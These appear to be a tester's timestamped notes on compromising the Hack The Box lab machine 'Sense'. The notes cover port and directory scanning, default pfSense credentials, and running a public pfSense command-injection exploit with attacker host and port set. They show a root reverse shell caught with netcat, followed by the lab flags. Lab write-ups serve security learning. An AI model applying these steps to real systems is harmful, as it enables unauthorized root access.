```
Exploit used: 
	-https://www.exploit-db.com/exploits/43560
	-

Privilege escalation used: 
	- exploit gave root, no priv esc needed.

Lessons learned:
-When presented with credentials ensure to try both upper and lowercase.
	-Example: Rohit/pfsense didnt work but rohit/pfsense did
-If theres no where else to go but a web server exists, ensure to run more gobuster/webfuzzers
	-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt -t 250

Loot:

# cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86

# cat user.txt
8721327cc232073b40d27d9c17e7348b 
```

```


```

```
```
```
01Feb2023
15:39
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.10.10.60 
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-server-header: lighttpd/1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
```

```
15:43
┌──(root㉿kali)-[/home/kali/Documents/hackthebox]
└─# nmap -Pn -sV -sC -p- -oN full 10.10.10.60
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 20:42 EST

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 20:42 EST
Nmap scan report for 10.10.10.60
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-title: Login
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
```

```
15:44
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u http://10.10.10.60:80 -x 400,401,403

Target: http://10.10.10.60:80/

[20:43:51] Starting: 
[20:44:27] 301 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  ->  https://10.10.10.60/examples/jsp/%252e%252e/%252e%252e/manager/html/

- nothing here.
```

```
15:51
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.60:80/ -k -e -b 404 -t 80
 
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.60:80 -x php,html,jsp,js

- both commands errored out
```

```
15:54
-browsed to http://10.10.10.60:80 
	- shows pf sense router login page , reference image 5.
-creds tried:
	admin:admin
	root:root
	admin:pfsense (default creds)
	root:pfsense
	
```

```
15:58
┌──(root㉿kali)-[/home/kali]
└─# searchsploit lighttpd 1.4.35                                                                            
Exploits: No Results
Shellcodes: No Results
                                                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# searchsploit lighttpd       
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
lighttpd - Denial of Service (PoC)                                                 | linux/dos/18295.txt
Lighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclo | windows/remote/30322.rb
Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                 | multiple/remote/4391.c
Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                 | linux/remote/4437.c
lighttpd 1.4.31 - Denial of Service (PoC)                                          | linux/dos/22902.sh
Lighttpd 1.4.x - mod_userdir Information Disclosure                                | linux/remote/31396.txt
lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                  | linux/dos/33591.sh
Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure                           | multiple/remote/8786.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

- going to look into
	- Lighttpd 1.4.x - mod_userdir Information Disclosure                               linux/remote/31396.txt
```

```
16:20
- done looking into lighttp for now, cant find an exploit, foxusin g on pf sense
- unsure of pfsense version, cant find anytthing in burpsuite or on login page.
```

```
16:26
- going to look at walkthrough for next step, unable to find anything for initial access.
```

```
16:55
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt -t 250

===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/02/01 21:47:59 Starting gobuster in directory enumeration mode
===============================================================
/changelog.txt        (Status: 200) [Size: 271]
/system-users.txt     (Status: 200) [Size: 106]
/%7Echeckout%7E       (Status: 403) [Size: 345]
Progress: 441120 / 441122 (100.00%)

- re did gobuster, found actual files. taking a break.

```

```
17:46
-browsed to https://10.10.10.60:80/system-users.txt
	- got username - refer to image 8 for user.
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

```
17:49
- logged onto http://10.10.10.60:80 with credentials rohit/pfsense 
	- pfesense was the default for pfsense firewalls.
- looking around to see what is on firewall
```

```
17:55
- found version
	- 2.1.3-RELEASE (amd64)
	built on Thu May 01 15:52:13 EDT 2014
	FreeBSD 8.3-RELEASE-p16
- looking up exploits...
```

```
17:57
┌──(root㉿kali)-[/home/kali]
└─# searchsploit pfsense 2.1
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                                                                                                                     | php/webapps/31263.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                                            | php/webapps/43560.py
Shellcodes: No Results

- https://www.exploit-db.com/exploits/43560
	- page for pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection  

```

```
18:02
- modified the script with below parameters
rhost = "10.10.10.60"
lhost = "10.10.16.5"
lport = 1234
username = "rohit"
password = "pfsense"
```

```
18:04
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/sense]
└─# chmod +x CVE-2014-4688-pfsense-2.1.3.py  
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/sense]
└─# ls
CVE-2014-4688-pfsense-2.1.3.py
```

```
18:07
- exploit thrown.
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/sense]
└─# python3 CVE-2014-4688-pfsense-2.1.3.py
CSRF token obtained
Running exploit...
Exploit completed

```

``` 
18:08
- setup nc listener and caught exploit
┌──(root㉿kali)-[/usr/share/wordlists/dirbuster]
└─# nc -lvnp 1234                
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.60] 8395
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# 

````

```
18:12
- unable to upgrade into bash shell with below command. crashed have to reset vm.
	- python -c 'import pty; pty.spawn("/bin/bash")'
```

```
18:23
# cat user.txt
8721327cc232073b40d27d9c17e7348b 

```

```
18:24
# cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86

```